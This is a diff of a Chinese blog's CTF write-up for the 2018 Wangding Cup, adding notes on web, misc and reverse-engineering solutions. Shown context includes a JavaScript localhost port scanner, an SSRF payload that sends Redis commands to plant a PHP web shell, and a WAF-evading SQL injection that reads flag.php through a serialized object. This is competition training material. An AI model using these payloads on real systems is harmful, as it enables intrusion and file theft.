@@ -100,7 +100,7 @@
 <meta property="og:url" content="http://Merl1ng.com/2018/08/20/网鼎杯wp/index.html">
 <meta property="og:site_name" content="Merl1ng's blog">
 <meta property="og:description" content="这比赛把人打到自闭">
-<meta property="og:updated_time" content="2018-08-21T13:20:50.551Z">
+<meta property="og:updated_time" content="2018-08-28T10:23:05.556Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="网鼎杯wp">
 <meta name="twitter:description" content="这比赛把人打到自闭">
@@ -335,7 +335,8 @@
 <p>题目本身出的非常好 行云流水般的内网操作</p>
 <p><a href="https://mp.weixin.qq.com/s?__biz=MzUzNTkyODI0OA==&amp;mid=2247491146&amp;idx=3&amp;sn=62911c7eede3f3207bd3badb65983d8d&amp;chksm=faff529dcd88db8b00fc09b58bd8d86ebbbd6463cba8d9319718e4ded7046fc60c76475aa943&amp;mpshare=1&amp;scene=23&amp;srcid=0820KKS4SsULFtWOy9z1xffV#rd" target="_blank" rel="external">https://mp.weixin.qq.com/s?__biz=MzUzNTkyODI0OA==&amp;mid=2247491146&amp;idx=3&amp;sn=62911c7eede3f3207bd3badb65983d8d&amp;chksm=faff529dcd88db8b00fc09b58bd8d86ebbbd6463cba8d9319718e4ded7046fc60c76475aa943&amp;mpshare=1&amp;scene=23&amp;srcid=0820KKS4SsULFtWOy9z1xffV#rd</a></p>
 <p><a href="https://xz.aliyun.com/t/2607" target="_blank" rel="external">https://xz.aliyun.com/t/2607</a></p>
-<p>题目显示为在线爬虫分析 可以上传html文件</p>
+<p><a href="https://www.xmsec.cc/wdb-review/" target="_blank" rel="external">https://www.xmsec.cc/wdb-review/</a></p>
+<p>题目是一个在线爬虫解析HTML A标签的的功能，显示会把tag A的内容打印在屏幕上</p>
 <p>首先扫目录 robots.txt</p>
 <p>查看发现 目录  get_sourcecode</p>
 <p>尝试访问 提示 NOT 127.0.0.1</p>
@@ -356,14 +357,16 @@
 <p>通过JS端口探测</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">&lt;a id=<span class="string">"result"</span>&gt;&lt;/a&gt;</div><div class="line"></div><div class="line">&lt;script&gt;</div><div class="line"></div><div class="line">var data = document.getElementById(<span class="string">'result'</span>).innerHTML;</div><div class="line"></div><div class="line">var TagName = document.getElementsByTagName(<span class="string">"body"</span>)[0];</div><div class="line"></div><div class="line">ports=[80,81,88,6379,8000,8080,8088];</div><div class="line"></div><div class="line"><span class="keyword">for</span>(var i <span class="keyword">in</span> ports)&#123;</div><div class="line"></div><div class="line">    var script =   document.createElement(<span class="string">"script"</span>);</div><div class="line"></div><div class="line">    poc = <span class="string">"data += '"</span>   + ports[i] + <span class="string">" OPEN; '; document.getElementById('result').innerHTML =   data;"</span></div><div class="line"></div><div class="line">      script.setAttribute(<span class="string">"src"</span>,<span class="string">"http://127.0.0.1:"</span> +   ports[i]);</div><div class="line"></div><div class="line">      script.setAttribute(<span class="string">"onload"</span>, poc);</div><div class="line"></div><div class="line">    TagName.appendChild(script);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
 <p>这里有个小坑，通过 JS 代码并不能发现 redis 的端口6379是开放的，但是该端口确实是开放的。有人说 JS 代码只能探测Web类端口，在探测redis端口的时候回卡在等待界面</p>
-<p>CTF中redis环境是3.0版本。不过redis&gt;=3.2版本，会过滤一些特殊字符，直接利用js发送http请求，由于POST数据包的特殊字符被过滤，导致链接会被redis关闭，所以不会执行后面的写文件等payload</p>
+<p>getshell后可以发现CTF中redis环境是2.8版本。不过redis&gt;=3.2版本，会过滤一些特殊字符，直接利用js发送http请求，由于POST数据包的特殊字符被过滤，导致链接会被redis关闭，所以不会执行后面的写文件等payload</p>
 <p>所以这里为什么还不清楚</p>
 <p>得到8000端口开放着，猜测是apache2等phpserver</p>
 <p>构造一个Redis EXP</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;a href=<span class="string">""</span> id=<span class="string">"flag"</span>&gt;<span class="built_in">test</span>&lt;/a&gt;</div><div class="line">level=low_273eac1c</div><div class="line"></div><div class="line">&lt;script&gt;</div><div class="line"></div><div class="line">           var xmlHttp;</div><div class="line"></div><div class="line">           <span class="keyword">if</span>(window.XMLHttpRequest)&#123;</div><div class="line"></div><div class="line">                xmlHttp = new XMLHttpRequest();</div><div class="line"></div><div class="line">           &#125;<span class="keyword">else</span>&#123;</div><div class="line"></div><div class="line">          xmlHttp = newActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</div><div class="line"></div><div class="line">           &#125;</div><div class="line"></div><div class="line">           var formData = new FormData();</div><div class="line"></div><div class="line">   formData.append(<span class="string">"0"</span>,<span class="string">"flushall"</span>+<span class="string">"\n"</span>+<span class="string">"config set dir /var/www/html/"</span>+<span class="string">"\n"</span>+<span class="string">"config set dbfilename shell.php"</span>+<span class="string">"\n"</span>+<span class="string">'set 1 "\\n\\n&lt;?php header(\'</span>Access-Control-Allow-Origin:*\<span class="string">'); echo file_get_contents($_GET[0]);?&gt;\\n\\n"'</span>+<span class="string">"\n"</span>+<span class="string">"save"</span>+<span class="string">"\n"</span>+<span class="string">"quit"</span>);</div><div class="line"></div><div class="line">           xmlHttp.open(<span class="string">"POST"</span>,<span class="string">"http://127.0.0.1:6379"</span>,<span class="literal">true</span>);</div><div class="line"></div><div class="line">           xmlHttp.send(formData);</div><div class="line"></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>加 level=low_273eac1c 因为源码以有写过滤</p>
 <p>这里有个坑点</p>
 <p><strong>因为不同端口，所以存在跨域，需要加上Access-Control-Allow-Origin:* 头部 (CORS)</strong></p>
 <p>有关同源和跨域<br><a href="https://www.cnblogs.com/rockmadman/p/6836834.html" target="_blank" rel="external">https://www.cnblogs.com/rockmadman/p/6836834.html</a></p>
+<p>这里是盲打 你也不着写进去没 所以比赛时在不知道是不是正确时会很慌 无形增大难度</p>
 <p>最后再构造一个HTML利用webshell</p>
 <p><a href="" id="flag">test</a></p>
 <script type="text/javascript">
@@ -429,7 +432,12 @@ loadXMLDoc();
 <p>能看懂的反序列化学习<br><a href="https://www.cnblogs.com/perl6/p/7124345.html" target="_blank" rel="external">https://www.cnblogs.com/perl6/p/7124345.html</a></p>
 <p>直接用 union select 会被WAF检测到，所以我们添加了 /**/</p>
 <p><code>-1/**/union/**/select/**/1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;yyy&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;</code></p>
-<p>有一点sql注入时我感觉十分重要 就是回显位的判断</p>
+<p>var/www/html/ 路径报错的时候给了 不给的话大概也能猜到</p>
+<p>flag.php字典大的话可以跑出来 </p>
+<p>为啥不直接http读flag.php</p>
+<p>其实稍微试一下就能发现 http的协议也能得到base64的回显的 but只有flag.php没有base64的回显 应该是过滤了</p>
+<p>使用http协议没办法读到flag 又给了文件路径 最简单的办法就是file协议</p>
+<p>最后有一点sql注入时我感觉十分重要 <strong>就是回显位的判断</strong></p>
 <p>?=-1或者加 and 1=2 让它自带语句不执行好回显我们的union是其一</p>
 <p>还有你 union select 1,2,3,4 可能回显位只有一个 比如这题在 2 要是不仔细看下就得当盲注做了..</p>
 <p>仍记得当时强网杯three hit那道sql没看回显位以为不能回显当盲注做的。。而且那道题还是二次注入当时脚本没写出来。。纯手工注入的。。。简直累死</p>
@@ -438,13 +446,29 @@ loadXMLDoc();
 <p>正解为stegsolve发现red0通道为空</p>
 <p>猜测是0通道有问题，将其他plane 0通道（red，green，Alpha）提取并且保存，使用Stegsolve对三张图片分别做Image Combiner对比 ，最后发现Alpha plane 0和green plane 0通道进行XOR（异或） 就可以得到flag</p>
 <p><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/81870097" target="_blank" rel="external">https://blog.csdn.net/xiangshangbashaonian/article/details/81870097</a></p>
-<h3 id="clip"><a href="#clip" class="headerlink" title="clip"></a>clip</h3><p>这题被题目描述坑了 说什么从老旧损坏硬盘恢复的文件系统</p>
+<h3 id="clip"><a href="#clip" class="headerlink" title="clip"></a>clip</h3><p><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/81906161" target="_blank" rel="external">https://blog.csdn.net/xiangshangbashaonian/article/details/81906161</a></p>
+<p>这题被题目描述坑了 说什么从老旧损坏硬盘恢复的文件系统</p>
 <p>我一直试文件恢复的操作。。</p>
+<p>结果是winhex直接搜索</p>
+<p>有师傅说disk是应该linux挂载的 但既然提示损坏就应该不是这个方向 有点牵强orz</p>
 <p>结果从文件中可以搜索到两个png图片 注意有一个是没有png文件头的 </p>
 <p>这里最搜索 <strong>IDAT</strong> 涨姿势了orz</p>
 <p><a href="https://blog.csdn.net/SWEET0SWAT/article/details/81879942" target="_blank" rel="external">https://blog.csdn.net/SWEET0SWAT/article/details/81879942</a></p>
 <p>但这种做法好像不是预期 预期可能是什么zlib compress解密</p>
 <p>当时我 binwalk -e能出来超级多的zlib 然后我就不会了。。</p>
+<h2 id="记录一道re"><a href="#记录一道re" class="headerlink" title="记录一道re"></a>记录一道re</h2><p><a href="https://paper.tuisec.win/detail/f8d629ce47c117c" target="_blank" rel="external">https://paper.tuisec.win/detail/f8d629ce47c117c</a></p>
+<p>为啥想记录这道re呢 因为看wp把我吓到了 大师傅直接就能看出来字符串是xor的。。膜拜</p>
+<p>贴下原话</p>
+<p>老年misc选手,看到输出得到加密后的flag:4b404c4b5648725b445845734c735949405c414d5949725c45495a51<br>像是异或flag后的结果</p>
+<p>import libnum<br>In [97]: libnum.n2s(0x4b404c4b5648725b445845734c735949405c414d5949725c45495a51)<br>Out[97]: ‘K@LKVHr[DXEsLsYI@\AMYIr\EIZQ’</p>
+<p>猜测:<br>In [93]: ord(“f”)^0x4b<br>Out[93]: 45</p>
+<p>In [94]: ord(“g”)^0x4b<br>Out[94]: 44</p>
+<p>In [95]: ord(“l”)^0x40<br>Out[95]: 44</p>
+<p>In [96]: ord(“a”)^0x4c<br>Out[96]: 45</p>
+<p>xor key 为45,44</p>
+<p>In [98]: enc = libnum.n2s(0x4b404c4b5648725b445845734c735949405c414d5949725c45495a51)</p>
+<p>In [99]: flag = “”<br>In [102]: for i in range(len(enc)):<br>     …:     if i%2==0:<br>     …:         flag+=chr(ord(enc[i])^45)<br>     …:     else:<br>     …:         flag+=chr(ord(enc[i])^44)<br>     …:<br>     …:         </p>
+<p>In [103]: print flag<br>flag{d_with_a_template_phew}</p>
 
       
     </div>
@@ -480,6 +504,10 @@ loadXMLDoc();
       
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/28/巅峰极客第二场wp/" rel="next" title="巅峰极客第二场wp">
+                <i class="fa fa-chevron-left"></i> 巅峰极客第二场wp
+              </a>
             
           </div>
 
@@ -562,7 +590,7 @@ loadXMLDoc();
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">69</span>
+                <span class="site-state-item-count">70</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
@@ -639,7 +667,7 @@ loadXMLDoc();
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web1000"><span class="nav-number">1.1.</span> <span class="nav-text">web1000</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#小结"><span class="nav-number">1.1.1.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#facebook"><span class="nav-number">1.2.</span> <span class="nav-text">facebook</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc"><span class="nav-number">2.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#minifie"><span class="nav-number">2.1.</span> <span class="nav-text">minifie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#clip"><span class="nav-number">2.2.</span> <span class="nav-text">clip</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web1000"><span class="nav-number">1.1.</span> <span class="nav-text">web1000</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#小结"><span class="nav-number">1.1.1.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#facebook"><span class="nav-number">1.2.</span> <span class="nav-text">facebook</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc"><span class="nav-number">2.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#minifie"><span class="nav-number">2.1.</span> <span class="nav-text">minifie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#clip"><span class="nav-number">2.2.</span> <span class="nav-text">clip</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#记录一道re"><span class="nav-number">3.</span> <span class="nav-text">记录一道re</span></a></li></ol></div>
             
 
           </div>
